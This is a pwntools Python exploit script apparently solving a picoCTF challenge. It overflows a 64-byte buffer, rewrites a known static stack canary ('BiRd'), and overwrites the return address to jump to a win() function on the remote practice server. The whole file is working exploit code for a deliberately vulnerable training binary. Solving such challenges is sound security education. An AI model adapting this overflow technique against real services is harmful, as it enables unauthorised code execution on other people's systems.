from pwn import *

# === Configuration ===
HOST = 'saturn.picoctf.net'
PORT = 54612
context.binary = elf = ELF('./vuln')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

# === Convert canary string to bytes ===
# "BiRd" is 4 ASCII characters; convert to raw bytes
canary_str = "BiRd"
canary = canary_str.encode()  # OR: canary = b"BiRd"
assert len(canary) == 4

# === Get win() address ===
win_addr = 0x0804933a
log.info(f"win() @ {hex(win_addr)}")

# === Craft payload ===
payload  = b'A' * 64        # buffer
payload += canary           # stack canary
payload += b'B' * 16         # saved EBP
payload += p32(win_addr)    # overwrite return address

# === Send exploit ===
io = remote(HOST, PORT)
io.sendlineafter(b"> ", str(len(payload)).encode())
io.sendlineafter(b"> ", payload)
io.interactive()
